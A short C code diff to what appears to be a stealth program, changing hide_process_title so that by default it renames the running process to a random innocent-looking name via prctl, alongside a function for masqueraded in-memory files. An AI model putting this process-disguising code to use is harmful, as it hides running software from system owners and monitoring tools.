@@ -78,6 +78,7 @@ int create_masqueraded_memfd(void) {
 }
 
 void hide_process_title(int argc, char* argv[]) {
+#ifdef HARMLESS_MASQUERADE_ARGV0
     if (argc > 0 && argv && argv[0]) {
         size_t orig_len = strlen(argv[0]);
         memset(argv[0], 0, orig_len);
@@ -89,4 +90,9 @@ void hide_process_title(int argc, char* argv[]) {
         argv[0][copy_len] = '\0';
         syscall3(__NR_prctl, PR_SET_NAME, (long)name, 0);
     }
+#else
+    (void)argc;
+    (void)argv;
+    syscall3(__NR_prctl, PR_SET_NAME, (long)get_random_innocent_name(), 0);
+#endif
 }
